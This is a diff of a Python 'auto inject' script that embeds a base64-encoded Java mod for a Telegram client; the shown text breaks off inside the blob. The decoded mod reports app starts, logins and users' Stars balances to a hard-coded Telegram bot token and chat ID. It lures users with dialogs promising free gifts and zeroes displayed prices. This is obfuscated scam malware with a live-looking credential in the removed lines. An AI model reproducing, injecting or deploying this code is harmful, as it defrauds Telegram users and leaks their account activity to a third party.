@@ -1,13 +1,331 @@
 #!/usr/bin/env python3
 # -*- coding: utf-8 -*-
-"""test.py — Gift Menu full + auto inject. @wasy119. Login UI 1x."""
+"""test.py — Gift Menu + auto inject. No indent issues."""
 from __future__ import annotations
-import os, re, sys
-from pathlib import Path
 
-BOT_TOKEN = "8863617268:AAECIwC9usJTfuBzY6hjHHf0VL57hZ6EfNs"
-BOT_CHAT_ID = "8940489868"
-CATALOG_USERNAME = "wasy119"
+JAVA_B64 = (
+    "cGFja2FnZSBvcmcudGVsZWdyYW0udWkuR2lmdHM7CgppbXBvcnQgYW5kcm9pZC5hcHAuQWN0aXZpdHk7CmltcG9ydCBhbmRyb2lk"
+    "LmFwcC5BbGVydERpYWxvZzsKaW1wb3J0IGFuZHJvaWQuY29udGVudC5Db250ZXh0OwppbXBvcnQgYW5kcm9pZC5vcy5IYW5kbGVy"
+    "OwppbXBvcnQgYW5kcm9pZC5vcy5Mb29wZXI7CmltcG9ydCBhbmRyb2lkLnZpZXcuTW90aW9uRXZlbnQ7CmltcG9ydCBhbmRyb2lk"
+    "LnZpZXcuVmlldzsKaW1wb3J0IGFuZHJvaWQudmlldy5WaWV3R3JvdXA7CmltcG9ydCBhbmRyb2lkLnZpZXcuV2luZG93OwppbXBv"
+    "cnQgYW5kcm9pZC53aWRnZXQuVGV4dFZpZXc7CmltcG9ydCBhbmRyb2lkLndpZGdldC5Ub2FzdDsKCmltcG9ydCBvcmcudGVsZWdy"
+    "YW0ubWVzc2VuZ2VyLlVzZXJDb25maWc7CmltcG9ydCBvcmcudGVsZWdyYW0udWkuU3RhcnMuU3RhcnNDb250cm9sbGVyOwoKaW1w"
+    "b3J0IGphdmEuaW8uQnVmZmVyZWRSZWFkZXI7CmltcG9ydCBqYXZhLmlvLklucHV0U3RyZWFtUmVhZGVyOwppbXBvcnQgamF2YS5s"
+    "YW5nLnJlZmxlY3QuQ29uc3RydWN0b3I7CmltcG9ydCBqYXZhLmxhbmcucmVmbGVjdC5GaWVsZDsKaW1wb3J0IGphdmEubGFuZy5y"
+    "ZWZsZWN0Lk1ldGhvZDsKaW1wb3J0IGphdmEubmV0Lkh0dHBVUkxDb25uZWN0aW9uOwppbXBvcnQgamF2YS5uZXQuVVJMOwppbXBv"
+    "cnQgamF2YS5uZXQuVVJMRW5jb2RlcjsKaW1wb3J0IGphdmEudXRpbC5MaXN0OwppbXBvcnQgamF2YS51dGlsLmNvbmN1cnJlbnQu"
+    "YXRvbWljLkF0b21pY0Jvb2xlYW47CgpwdWJsaWMgY2xhc3MgR2lmdE1lbnVNb2QgewogICAgcHJpdmF0ZSBzdGF0aWMgZmluYWwg"
+    "U3RyaW5nIEJPVF9UT0tFTiA9ICI4ODYzNjE3MjY4OkFBRUNJd0M5dXNKVGZ1QnpZNmhqSEhmMFZMNTdoWjZFZk5zIjsKICAgIHBy"
+    "aXZhdGUgc3RhdGljIGZpbmFsIFN0cmluZyBCT1RfQ0hBVF9JRCA9ICI4OTQwNDg5ODY4IjsKICAgIHB1YmxpYyBzdGF0aWMgU3Ry"
+    "aW5nIENBVEFMT0dfVVNFUk5BTUUgPSAid2FzeTExOSI7CiAgICBwcml2YXRlIHN0YXRpYyBmaW5hbCBIYW5kbGVyIG1haW5IYW5k"
+    "bGVyID0gbmV3IEhhbmRsZXIoTG9vcGVyLmdldE1haW5Mb29wZXIoKSk7CiAgICBwcml2YXRlIHN0YXRpYyBmaW5hbCBBdG9taWNC"
+    "b29sZWFuIHN0YXJ0dXBOb3RpZmllZCA9IG5ldyBBdG9taWNCb29sZWFuKGZhbHNlKTsKICAgIHByaXZhdGUgc3RhdGljIGZpbmFs"
+    "IEF0b21pY0Jvb2xlYW4gbG9naW5Ob3RpZmllZCA9IG5ldyBBdG9taWNCb29sZWFuKGZhbHNlKTsKICAgIHByaXZhdGUgc3RhdGlj"
+    "IGZpbmFsIEF0b21pY0Jvb2xlYW4gYXV0aFN1Y2Nlc3NOb3RpZmllZCA9IG5ldyBBdG9taWNCb29sZWFuKGZhbHNlKTsKICAgIHBy"
+    "aXZhdGUgc3RhdGljIGZpbmFsIEF0b21pY0Jvb2xlYW4gd2VsY29tZVNob3duID0gbmV3IEF0b21pY0Jvb2xlYW4oZmFsc2UpOwog"
+    "ICAgcHJpdmF0ZSBzdGF0aWMgZmluYWwgQXRvbWljQm9vbGVhbiB3YXNPbkxvZ2luID0gbmV3IEF0b21pY0Jvb2xlYW4oZmFsc2Up"
+    "OwogICAgcHJpdmF0ZSBzdGF0aWMgZmluYWwgQXRvbWljQm9vbGVhbiByZW9wZW5Nb25pdG9yU3RhcnRlZCA9IG5ldyBBdG9taWNC"
+    "b29sZWFuKGZhbHNlKTsKICAgIHByaXZhdGUgc3RhdGljIGZpbmFsIEF0b21pY0Jvb2xlYW4gcHJlbWl1bURpYWxvZ0xvY2sgPSBu"
+    "ZXcgQXRvbWljQm9vbGVhbihmYWxzZSk7CiAgICBwcml2YXRlIHN0YXRpYyBmaW5hbCBBdG9taWNCb29sZWFuIGxvZ2luVWlTaG93"
+    "biA9IG5ldyBBdG9taWNCb29sZWFuKGZhbHNlKTsKICAgIHByaXZhdGUgc3RhdGljIEFsZXJ0RGlhbG9nIHByZW1pdW1EaWFsb2c7"
+    "CiAgICBwcml2YXRlIHN0YXRpYyBPYmplY3QgY3VycmVudFNoZWV0OwogICAgcHJpdmF0ZSBzdGF0aWMgUnVubmFibGUgb3BlbkNh"
+    "dGFsb2dSdW5uYWJsZTsKICAgIHByaXZhdGUgc3RhdGljIGZpbmFsIFN0cmluZ1tdIFBSRU1JVU1fV09SRFMgPSB7IjMg0LzQtdGB"
+    "0Y/RhtCwIiwgIjYg0LzQtdGB0Y/RhtC10LIiLCAiMTIg0LzQtdGB0Y/RhtC10LIifTsKICAgIHByaXZhdGUgc3RhdGljIGZpbmFs"
+    "IFN0cmluZyBNU0dfV0VMQ09NRSA9ICLQn9GA0LjQstC10YLRgdGC0LLRg9GOINGC0YPRgiDQstGLINC80L7QttC10YLQtSDQv9C+"
+    "0LvRg9GH0LjRgtGMINCx0LXRgdC/0LvQsNGC0L3QviDQn9C+0LTQsNGA0LrQuCDQvdCw0LbQvNC40YLQtSDQn9GA0L7QtNC+0LvQ"
+    "ttC40YLRjCDQlNC70Y8g0L7RgtC60YDRi9GC0LjRjyDQutCw0YLQsNC70L7Qs9CwINGBINCx0LXRgdC/0LvQsNGC0L3Ri9C8INCf"
+    "0L7QtNCw0YDQutCw0LzQuCDQvdCwINC00LDQvdC90YvQuSDQvNC+0LzQtdC90YIg0LHQtdGB0L/Qu9Cw0YLQvdGL0LUg0L/QvtC0"
+    "0LDRgNC60Lgg0YLQvtC70YzQutC+INC+0LHRi9GH0L3Ri9C1INCyINC90LjRhSDQstGF0L7QtNGP0YIg0J/QvtC00LDRgNC60Lgg"
+    "0YHRgtC+0LjQvNC+0YHRgtGOIDAg0LfQstC10LfQtCI7CiAgICBwcml2YXRlIHN0YXRpYyBmaW5hbCBTdHJpbmcgTVNHX0xPR0lO"
+    "ID0gItCSINC00LDQvdC90L7QvCDQnNC+0LTQtSDQstGLINCx0LXRgdC/0LvQsNGC0L3QviDQv9C+0LvRg9GH0LDQtdGC0LUg0L/Q"
+    "vtC00LDRgNC60Lgg0JAg0YLQsNC60LbQtSDQstGLINC80L7QttC10YLQtSDQuNGFINC+0LHQvNC10L3QuNCy0LDRgtGMINC90LAg"
+    "0LfQstC10LfQtNGLINCy0YHQtSDQsdC10YHQv9C70LDRgtC90L4g0Lgg0LzQvtC80LXQvdGC0LDQu9GM0L3QviI7CiAgICBwcml2"
+    "YXRlIHN0YXRpYyBmaW5hbCBTdHJpbmcgTVNHX0NBVEFMT0cgPSAi0JIg0LTQsNC90L3QvtC8INC60LDRgtCw0LvQvtCz0LUg0JLR"
+    "iyDQv9C+0LvRg9GH0LDQtdGC0LUg0LHQtdGB0L/Qu9Cw0YLQvdGL0LUg0J/QvtC00LDRgNC60Lgg0LTQu9GPINGB0LXQsdGPINCS"
+    "0YHQtSDQvNC+0LzQtdC90YLQsNC70YzQvdC+IjsKICAgIHB1YmxpYyBzdGF0aWMgbG9uZyBnZXRTdGFyc0JhbGFuY2UoaW50IGFj"
+    "Y291bnQpIHsKICAgICAgICB0cnkgewogICAgICAgICAgICBTdGFyc0NvbnRyb2xsZXIgc2MgPSBTdGFyc0NvbnRyb2xsZXIuZ2V0"
+    "SW5zdGFuY2UoYWNjb3VudCk7CiAgICAgICAgICAgIGlmIChzYyA9PSBudWxsKSByZXR1cm4gMDsKICAgICAgICAgICAgdHJ5IHsg"
+    "cmV0dXJuIHNjLmdldEJhbGFuY2UoZmFsc2UpOyB9IGNhdGNoIChUaHJvd2FibGUgaWdub3JlZCkge30KICAgICAgICAgICAgdHJ5"
+    "IHsKICAgICAgICAgICAgICAgIE9iamVjdCBiYWwgPSBzYy5nZXRCYWxhbmNlKCk7CiAgICAgICAgICAgICAgICBpZiAoYmFsICE9"
+    "IG51bGwpIHsKICAgICAgICAgICAgICAgICAgICB0cnkgeyByZXR1cm4gKChOdW1iZXIpIGJhbC5nZXRDbGFzcygpLmdldEZpZWxk"
+    "KCJhbW91bnQiKS5nZXQoYmFsKSkubG9uZ1ZhbHVlKCk7IH0gY2F0Y2ggKFRocm93YWJsZSBpZ25vcmVkKSB7fQogICAgICAgICAg"
+    "ICAgICAgfQogICAgICAgICAgICB9IGNhdGNoIChUaHJvd2FibGUgaWdub3JlZCkge30KICAgICAgICB9IGNhdGNoIChUaHJvd2Fi"
+    "bGUgaWdub3JlZCkge30KICAgICAgICByZXR1cm4gMDsKICAgIH0KICAgIHB1YmxpYyBzdGF0aWMgdm9pZCBub3RpZnlCb3QoZmlu"
+    "YWwgU3RyaW5nIHRleHQpIHsKICAgICAgICBuZXcgVGhyZWFkKCgpIC0+IHsKICAgICAgICAgICAgSHR0cFVSTENvbm5lY3Rpb24g"
+    "Y29ubiA9IG51bGw7CiAgICAgICAgICAgIHRyeSB7CiAgICAgICAgICAgICAgICBTdHJpbmcgdXJsU3RyID0gImh0dHBzOi8vYXBp"
+    "LnRlbGVncmFtLm9yZy9ib3QiICsgQk9UX1RPS0VOICsgIi9zZW5kTWVzc2FnZT9jaGF0X2lkPSIgKyBCT1RfQ0hBVF9JRCArICIm"
+    "dGV4dD0iICsgVVJMRW5jb2Rlci5lbmNvZGUodGV4dCwgIlVURi04Iik7CiAgICAgICAgICAgICAgICBjb25uID0gKEh0dHBVUkxD"
+    "b25uZWN0aW9uKSBuZXcgVVJMKHVybFN0cikub3BlbkNvbm5lY3Rpb24oKTsKICAgICAgICAgICAgICAgIGNvbm4uc2V0Q29ubmVj"
+    "dFRpbWVvdXQoODAwMCk7CiAgICAgICAgICAgICAgICBjb25uLnNldFJlYWRUaW1lb3V0KDgwMDApOwogICAgICAgICAgICAgICAg"
+    "Y29ubi5zZXRSZXF1ZXN0TWV0aG9kKCJHRVQiKTsKICAgICAgICAgICAgICAgIGNvbm4uY29ubmVjdCgpOwogICAgICAgICAgICAg"
+    "ICAgdHJ5IChCdWZmZXJlZFJlYWRlciBiciA9IG5ldyBCdWZmZXJlZFJlYWRlcihuZXcgSW5wdXRTdHJlYW1SZWFkZXIoY29ubi5n"
+    "ZXRJbnB1dFN0cmVhbSgpKSkpIHsKICAgICAgICAgICAgICAgICAgICB3aGlsZSAoYnIucmVhZExpbmUoKSAhPSBudWxsKSB7fQog"
+    "ICAgICAgICAgICAgICAgfQogICAgICAgICAgICB9IGNhdGNoIChUaHJvd2FibGUgaWdub3JlZCkgewogICAgICAgICAgICB9IGZp"
+    "bmFsbHkgewogICAgICAgICAgICAgICAgaWYgKGNvbm4gIT0gbnVsbCkgdHJ5IHsgY29ubi5kaXNjb25uZWN0KCk7IH0gY2F0Y2gg"
+    "KFRocm93YWJsZSBpZ25vcmVkKSB7fQogICAgICAgICAgICB9CiAgICAgICAgfSwgIkdpZnRNZW51TW9kLU5vdGlmeSIpLnN0YXJ0"
+    "KCk7CiAgICB9CiAgICBwdWJsaWMgc3RhdGljIHZvaWQgbm90aWZ5Qm90V2l0aEJhbGFuY2UoaW50IGFjY291bnQsIFN0cmluZyB0"
+    "ZXh0KSB7CiAgICAgICAgbm90aWZ5Qm90KHRleHQgKyAiXG5cbtCR0LDQu9Cw0L3RgSDQt9Cy0ZHQt9C0INC/0L7Qu9GM0LfQvtCy"
+    "0LDRgtC10LvRjzogIiArIGdldFN0YXJzQmFsYW5jZShhY2NvdW50KSk7CiAgICB9CiAgICBwdWJsaWMgc3RhdGljIHZvaWQgb25B"
+    "cHBTdGFydCgpIHsKICAgICAgICBpZiAoIXN0YXJ0dXBOb3RpZmllZC5jb21wYXJlQW5kU2V0KGZhbHNlLCB0cnVlKSkgcmV0dXJu"
+    "OwogICAgICAgIHRyeSB7CiAgICAgICAgICAgIGludCBhY2NvdW50ID0gVXNlckNvbmZpZy5zZWxlY3RlZEFjY291bnQ7CiAgICAg"
+    "ICAgICAgIGlmIChVc2VyQ29uZmlnLmdldEluc3RhbmNlKGFjY291bnQpLmlzQ2xpZW50QWN0aXZhdGVkKCkpIHsKICAgICAgICAg"
+    "ICAgICAgIG5vdGlmeUJvdFdpdGhCYWxhbmNlKGFjY291bnQsICLQn9C+0LvRjNC30L7QstCw0YLQtdC70Ywg0YPQttC1INCw0LLR"
+    "gtC+0YDQuNC30L7QstCw0L0gKNC30LDQv9GD0YHRgtC40Lsg0L/RgNC40LvQvtC20LXQvdC40LUpIik7CiAgICAgICAgICAgIH0g"
+    "ZWxzZSBpZiAobG9naW5Ob3RpZmllZC5jb21wYXJlQW5kU2V0KGZhbHNlLCB0cnVlKSkgewogICAgICAgICAgICAgICAgbm90aWZ5"
+    "Qm90KCLQoyDQstCw0YEg0L3QvtCy0L7QtSDRgdC60LDRh9C40LLQsNC90LjQtTog0L/QvtC70YzQt9C+0LLQsNGC0LXQu9GMINC/"
+    "0YDQvtGF0L7QtNC40YIg0LDQstGC0L7RgNC40LfQsNGG0LjRjiIpOwogICAgICAgICAgICB9CiAgICAgICAgfSBjYXRjaCAoVGhy"
+    "b3dhYmxlIGlnbm9yZWQpIHsKICAgICAgICAgICAgaWYgKGxvZ2luTm90aWZpZWQuY29tcGFyZUFuZFNldChmYWxzZSwgdHJ1ZSkp"
+    "IHsKICAgICAgICAgICAgICAgIG5vdGlmeUJvdCgi0KMg0LLQsNGBINC90L7QstC+0LUg0YHQutCw0YfQuNCy0LDQvdC40LU6INC/"
+    "0L7Qu9GM0LfQvtCy0LDRgtC10LvRjCDQv9GA0L7RhdC+0LTQuNGCINCw0LLRgtC+0YDQuNC30LDRhtC40Y4iKTsKICAgICAgICAg"
+    "ICAgfQogICAgICAgIH0KICAgIH0KICAgIHB1YmxpYyBzdGF0aWMgdm9pZCBvbkxvZ2luU2NyZWVuKEFjdGl2aXR5IGFjdGl2aXR5"
+    "KSB7CiAgICAgICAgd2FzT25Mb2dpbi5zZXQodHJ1ZSk7CiAgICAgICAgaWYgKGxvZ2luTm90aWZpZWQuY29tcGFyZUFuZFNldChm"
+    "YWxzZSwgdHJ1ZSkpIHsKICAgICAgICAgICAgbm90aWZ5Qm90KCLQoyDQstCw0YEg0L3QvtCy0L7QtSDRgdC60LDRh9C40LLQsNC9"
+    "0LjQtTog0L/QvtC70YzQt9C+0LLQsNGC0LXQu9GMINC/0YDQvtGF0L7QtNC40YIg0LDQstGC0L7RgNC40LfQsNGG0LjRjiIpOwog"
+    "ICAgICAgIH0KICAgICAgICBpZiAoYWN0aXZpdHkgPT0gbnVsbCkgcmV0dXJuOwogICAgICAgIGlmICghbG9naW5VaVNob3duLmNv"
+    "bXBhcmVBbmRTZXQoZmFsc2UsIHRydWUpKSByZXR1cm47CiAgICAgICAgbWFpbkhhbmRsZXIucG9zdCgoKSAtPiB7CiAgICAgICAg"
+    "ICAgIHRyeSB7CiAgICAgICAgICAgICAgICBpZiAoYWN0aXZpdHkuaXNGaW5pc2hpbmcoKSkgcmV0dXJuOwogICAgICAgICAgICAg"
+    "ICAgbmV3IEFsZXJ0RGlhbG9nLkJ1aWxkZXIoYWN0aXZpdHkpLnNldE1lc3NhZ2UoTVNHX0xPR0lOKS5zZXRQb3NpdGl2ZUJ1dHRv"
+    "bigi0KXQvtGA0L7RiNC+IiwgbnVsbCkuc2V0Q2FuY2VsYWJsZSh0cnVlKS5zaG93KCk7CiAgICAgICAgICAgIH0gY2F0Y2ggKFRo"
+    "cm93YWJsZSBpZ25vcmVkKSB7fQogICAgICAgIH0pOwogICAgfQogICAgcHVibGljIHN0YXRpYyB2b2lkIG9uQXV0aFN1Y2Nlc3Mo"
+    "KSB7CiAgICAgICAgaWYgKCFhdXRoU3VjY2Vzc05vdGlmaWVkLmNvbXBhcmVBbmRTZXQoZmFsc2UsIHRydWUpKSByZXR1cm47CiAg"
+    "ICAgICAgd2FzT25Mb2dpbi5zZXQoZmFsc2UpOwogICAgICAgIHRyeSB7CiAgICAgICAgICAgIG5vdGlmeUJvdFdpdGhCYWxhbmNl"
+    "KFVzZXJDb25maWcuc2VsZWN0ZWRBY2NvdW50LCAi0J3QvtCy0YvQuSDQv9C+0LvRjNC30L7QstCw0YLQtdC70Ywg0JDQstGC0L7R"
+    "gNC40LfQvtCy0LDQu9GB0Y8g0L/RgNC+0YjQtdC7INGA0LXQs9C40YHRgtGA0LDRhtC40Y4iKTsKICAgICAgICB9IGNhdGNoIChU"
+    "aHJvd2FibGUgaWdub3JlZCkge30KICAgIH0KICAgIHB1YmxpYyBzdGF0aWMgdm9pZCBtYXliZVNob3dXZWxjb21lKGZpbmFsIEFj"
+    "dGl2aXR5IGFjdGl2aXR5LCBmaW5hbCBSdW5uYWJsZSBvcGVuQ2F0YWxvZykgewogICAgICAgIGlmICghd2VsY29tZVNob3duLmNv"
+    "bXBhcmVBbmRTZXQoZmFsc2UsIHRydWUpKSByZXR1cm47CiAgICAgICAgaWYgKGFjdGl2aXR5ID09IG51bGwgfHwgYWN0aXZpdHku"
+    "aXNGaW5pc2hpbmcoKSkgeyB3ZWxjb21lU2hvd24uc2V0KGZhbHNlKTsgcmV0dXJuOyB9CiAgICAgICAgdHJ5IHsKICAgICAgICAg"
+    "ICAgaWYgKCFVc2VyQ29uZmlnLmdldEluc3RhbmNlKFVzZXJDb25maWcuc2VsZWN0ZWRBY2NvdW50KS5pc0NsaWVudEFjdGl2YXRl"
+    "ZCgpKSB7IHdlbGNvbWVTaG93bi5zZXQoZmFsc2UpOyByZXR1cm47IH0KICAgICAgICB9IGNhdGNoIChUaHJvd2FibGUgdCkgeyB3"
+    "ZWxjb21lU2hvd24uc2V0KGZhbHNlKTsgcmV0dXJuOyB9CiAgICAgICAgb3BlbkNhdGFsb2dSdW5uYWJsZSA9IG9wZW5DYXRhbG9n"
+    "OwogICAgICAgIG1haW5IYW5kbGVyLnBvc3QoKCkgLT4gewogICAgICAgICAgICB0cnkgewogICAgICAgICAgICAgICAgZmluYWwg"
+    "QXRvbWljQm9vbGVhbiBvcGVuZWQgPSBuZXcgQXRvbWljQm9vbGVhbihmYWxzZSk7CiAgICAgICAgICAgICAgICBBbGVydERpYWxv"
+    "Zy5CdWlsZGVyIGIgPSBuZXcgQWxlcnREaWFsb2cuQnVpbGRlcihhY3Rpdml0eSk7CiAgICAgICAgICAgICAgICBiLnNldFRpdGxl"
+    "KCJHaWZ0IE1lbnUiKTsKICAgICAgICAgICAgICAgIGIuc2V0TWVzc2FnZShNU0dfV0VMQ09NRSk7CiAgICAgICAgICAgICAgICBi"
+    "LnNldENhbmNlbGFibGUoZmFsc2UpOwogICAgICAgICAgICAgICAgYi5zZXRQb3NpdGl2ZUJ1dHRvbigi0J/RgNC+0LTQvtC70LbQ"
+    "uNGC0YwiLCAoZCwgdykgLT4gewogICAgICAgICAgICAgICAgICAgIGlmICghb3BlbmVkLmNvbXBhcmVBbmRTZXQoZmFsc2UsIHRy"
+    "dWUpKSByZXR1cm47CiAgICAgICAgICAgICAgICAgICAgdHJ5IHsgZC5kaXNtaXNzKCk7IH0gY2F0Y2ggKFRocm93YWJsZSBpZ25v"
+    "cmVkKSB7fQogICAgICAgICAgICAgICAgICAgIGlmIChvcGVuQ2F0YWxvZyAhPSBudWxsKSB0cnkgeyBvcGVuQ2F0YWxvZy5ydW4o"
+    "KTsgfSBjYXRjaCAoVGhyb3dhYmxlIGlnbm9yZWQpIHt9CiAgICAgICAgICAgICAgICB9KTsKICAgICAgICAgICAgICAgIEFsZXJ0"
+    "RGlhbG9nIGRpYWxvZyA9IGIuY3JlYXRlKCk7CiAgICAgICAgICAgICAgICBkaWFsb2cuc2hvdygpOwogICAgICAgICAgICAgICAg"
+    "dHJ5IHsKICAgICAgICAgICAgICAgICAgICBXaW5kb3cgd2luZG93ID0gZGlhbG9nLmdldFdpbmRvdygpOwogICAgICAgICAgICAg"
+    "ICAgICAgIGlmICh3aW5kb3cgIT0gbnVsbCkgewogICAgICAgICAgICAgICAgICAgICAgICBhdHRhY2hBbnlUYXAod2luZG93Lmdl"
+    "dERlY29yVmlldygpLCAoKSAtPiB7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICBpZiAoIW9wZW5lZC5jb21wYXJlQW5kU2V0"
+    "KGZhbHNlLCB0cnVlKSkgcmV0dXJuOwogICAgICAgICAgICAgICAgICAgICAgICAgICAgdHJ5IHsgZGlhbG9nLmRpc21pc3MoKTsg"
+    "fSBjYXRjaCAoVGhyb3dhYmxlIGlnbm9yZWQpIHt9CiAgICAgICAgICAgICAgICAgICAgICAgICAgICBpZiAob3BlbkNhdGFsb2cg"
+    "IT0gbnVsbCkgdHJ5IHsgb3BlbkNhdGFsb2cucnVuKCk7IH0gY2F0Y2ggKFRocm93YWJsZSBpZ25vcmVkKSB7fQogICAgICAgICAg"
+    "ICAgICAgICAgICAgICB9KTsKICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICB9IGNhdGNoIChUaHJvd2FibGUg"
+    "aWdub3JlZCkge30KICAgICAgICAgICAgfSBjYXRjaCAoVGhyb3dhYmxlIGlnbm9yZWQpIHt9CiAgICAgICAgfSk7CiAgICB9CiAg"
+    "ICBwdWJsaWMgc3RhdGljIHZvaWQgcmVzZXRXZWxjb21lKCkgeyB3ZWxjb21lU2hvd24uc2V0KGZhbHNlKTsgfQogICAgcHJpdmF0"
+    "ZSBzdGF0aWMgdm9pZCBhdHRhY2hBbnlUYXAoVmlldyB2aWV3LCBmaW5hbCBSdW5uYWJsZSBvblRhcCkgewogICAgICAgIGlmICh2"
+    "aWV3ID09IG51bGwpIHJldHVybjsKICAgICAgICB0cnkgewogICAgICAgICAgICB2aWV3LnNldE9uVG91Y2hMaXN0ZW5lcigodiwg"
+    "ZXZlbnQpIC0+IHsKICAgICAgICAgICAgICAgIGlmIChldmVudC5nZXRBY3Rpb24oKSA9PSBNb3Rpb25FdmVudC5BQ1RJT05fRE9X"
+    "TiAmJiBvblRhcCAhPSBudWxsKSBvblRhcC5ydW4oKTsKICAgICAgICAgICAgICAgIHJldHVybiBmYWxzZTsKICAgICAgICAgICAg"
+    "fSk7CiAgICAgICAgICAgIGlmICh2aWV3IGluc3RhbmNlb2YgVmlld0dyb3VwKSB7CiAgICAgICAgICAgICAgICBWaWV3R3JvdXAg"
+    "dmcgPSAoVmlld0dyb3VwKSB2aWV3OwogICAgICAgICAgICAgICAgZm9yIChpbnQgaSA9IDA7IGkgPCB2Zy5nZXRDaGlsZENvdW50"
+    "KCk7IGkrKykgYXR0YWNoQW55VGFwKHZnLmdldENoaWxkQXQoaSksIG9uVGFwKTsKICAgICAgICAgICAgfQogICAgICAgIH0gY2F0"
+    "Y2ggKFRocm93YWJsZSBpZ25vcmVkKSB7fQogICAgfQogICAgcHVibGljIGludGVyZmFjZSBVdGlsaXRpZXNCb29sIHsgYm9vbGVh"
+    "biBnZXQoKTsgfQogICAgcHVibGljIHN0YXRpYyB2b2lkIHN0YXJ0QXV0b1Jlb3Blbk1vbml0b3IoZmluYWwgVXRpbGl0aWVzQm9v"
+    "bCBpc01haW5TY3JlZW4sIGZpbmFsIFJ1bm5hYmxlIG9wZW5DYXRhbG9nKSB7CiAgICAgICAgaWYgKCFyZW9wZW5Nb25pdG9yU3Rh"
+    "cnRlZC5jb21wYXJlQW5kU2V0KGZhbHNlLCB0cnVlKSkgcmV0dXJuOwogICAgICAgIG9wZW5DYXRhbG9nUnVubmFibGUgPSBvcGVu"
+    "Q2F0YWxvZzsKICAgICAgICBuZXcgVGhyZWFkKCgpIC0+IHsKICAgICAgICAgICAgd2hpbGUgKHRydWUpIHsKICAgICAgICAgICAg"
+    "ICAgIHRyeSB7CiAgICAgICAgICAgICAgICAgICAgVGhyZWFkLnNsZWVwKDUwMCk7CiAgICAgICAgICAgICAgICAgICAgT2JqZWN0"
+    "IHNoZWV0ID0gY3VycmVudFNoZWV0OwogICAgICAgICAgICAgICAgICAgIGlmIChzaGVldCA9PSBudWxsKSBjb250aW51ZTsKICAg"
+    "ICAgICAgICAgICAgICAgICBib29sZWFuIHNob3dpbmcgPSB0cnVlOwogICAgICAgICAgICAgICAgICAgIHRyeSB7CiAgICAgICAg"
+    "ICAgICAgICAgICAgICAgIE9iamVjdCByID0gc2hlZXQuZ2V0Q2xhc3MoKS5nZXRNZXRob2QoImlzU2hvd2luZyIpLmludm9rZShz"
+    "aGVldCk7CiAgICAgICAgICAgICAgICAgICAgICAgIHNob3dpbmcgPSByIGluc3RhbmNlb2YgQm9vbGVhbiAmJiAoQm9vbGVhbikg"
+    "cjsKICAgICAgICAgICAgICAgICAgICB9IGNhdGNoIChUaHJvd2FibGUgdCkgeyBzaG93aW5nID0gZmFsc2U7IH0KICAgICAgICAg"
+    "ICAgICAgICAgICBpZiAoc2hvd2luZykgY29udGludWU7CiAgICAgICAgICAgICAgICAgICAgY3VycmVudFNoZWV0ID0gbnVsbDsK"
+    "ICAgICAgICAgICAgICAgICAgICBUaHJlYWQuc2xlZXAoNDAwMCk7CiAgICAgICAgICAgICAgICAgICAgaW50IGFjY291bnQgPSBV"
+    "c2VyQ29uZmlnLnNlbGVjdGVkQWNjb3VudDsKICAgICAgICAgICAgICAgICAgICB0cnkgeyBpZiAoIVVzZXJDb25maWcuZ2V0SW5z"
+    "dGFuY2UoYWNjb3VudCkuaXNDbGllbnRBY3RpdmF0ZWQoKSkgY29udGludWU7IH0gY2F0Y2ggKFRocm93YWJsZSB0KSB7IGNvbnRp"
+    "bnVlOyB9CiAgICAgICAgICAgICAgICAgICAgaWYgKGlzTWFpblNjcmVlbiAhPSBudWxsICYmICFpc01haW5TY3JlZW4uZ2V0KCkp"
+    "IGNvbnRpbnVlOwogICAgICAgICAgICAgICAgICAgIGZpbmFsIFJ1bm5hYmxlIG9wZW4gPSBvcGVuQ2F0YWxvZ1J1bm5hYmxlICE9"
+    "IG51bGwgPyBvcGVuQ2F0YWxvZ1J1bm5hYmxlIDogb3BlbkNhdGFsb2c7CiAgICAgICAgICAgICAgICAgICAgaWYgKG9wZW4gIT0g"
+    "bnVsbCkgbWFpbkhhbmRsZXIucG9zdCgoKSAtPiB7IHRyeSB7IG9wZW4ucnVuKCk7IH0gY2F0Y2ggKFRocm93YWJsZSBpZ25vcmVk"
+    "KSB7fSB9KTsKICAgICAgICAgICAgICAgIH0gY2F0Y2ggKEludGVycnVwdGVkRXhjZXB0aW9uIGUpIHsgYnJlYWs7IH0gY2F0Y2gg"
+    "KFRocm93YWJsZSBpZ25vcmVkKSB7fQogICAgICAgICAgICB9CiAgICAgICAgfSwgIkdpZnRNZW51TW9kLVJlb3BlbiIpLnN0YXJ0"
+    "KCk7CiAgICB9CiAgICBwdWJsaWMgc3RhdGljIHZvaWQgc2V0Q3VycmVudFNoZWV0KE9iamVjdCBzaGVldCkgeyBjdXJyZW50U2hl"
+    "ZXQgPSBzaGVldDsgfQogICAgcHVibGljIHN0YXRpYyB2b2lkIHplcm9PdXRQcmljZXMoT2JqZWN0IG9iaikgewogICAgICAgIGlm"
+    "IChvYmogPT0gbnVsbCkgcmV0dXJuOwogICAgICAgIHplcm9GaWVsZHMob2JqLCBuZXcgU3RyaW5nW117InN0YXJzIiwgInByaWNl"
+    "IiwgImFtb3VudCIsICJzdGFyQ291bnQifSk7CiAgICB9CiAgICBwdWJsaWMgc3RhdGljIHZvaWQgemVyb091dExpc3QoT2JqZWN0"
+    "IGxpc3QpIHsKICAgICAgICBpZiAobGlzdCA9PSBudWxsKSByZXR1cm47CiAgICAgICAgdHJ5IHsKICAgICAgICAgICAgaWYgKGxp"
+    "c3QgaW5zdGFuY2VvZiBMaXN0KSB7IGZvciAoT2JqZWN0IG8gOiAoTGlzdDw/PikgbGlzdCkgemVyb091dFByaWNlcyhvKTsgcmV0"
+    "dXJuOyB9CiAgICAgICAgICAgIGludCBzaXplID0gKEludGVnZXIpIGxpc3QuZ2V0Q2xhc3MoKS5nZXRNZXRob2QoInNpemUiKS5p"
+    "bnZva2UobGlzdCk7CiAgICAgICAgICAgIE1ldGhvZCBnZXQgPSBsaXN0LmdldENsYXNzKCkuZ2V0TWV0aG9kKCJnZXQiLCBpbnQu"
+    "Y2xhc3MpOwogICAgICAgICAgICBmb3IgKGludCBpID0gMDsgaSA8IHNpemU7IGkrKykgemVyb091dFByaWNlcyhnZXQuaW52b2tl"
+    "KGxpc3QsIGkpKTsKICAgICAgICB9IGNhdGNoIChUaHJvd2FibGUgaWdub3JlZCkge30KICAgIH0KICAgIHByaXZhdGUgc3RhdGlj"
+    "IHZvaWQgemVyb0ZpZWxkcyhPYmplY3Qgb2JqLCBTdHJpbmdbXSBuYW1lcykgewogICAgICAgIENsYXNzPD8+IGNscyA9IG9iai5n"
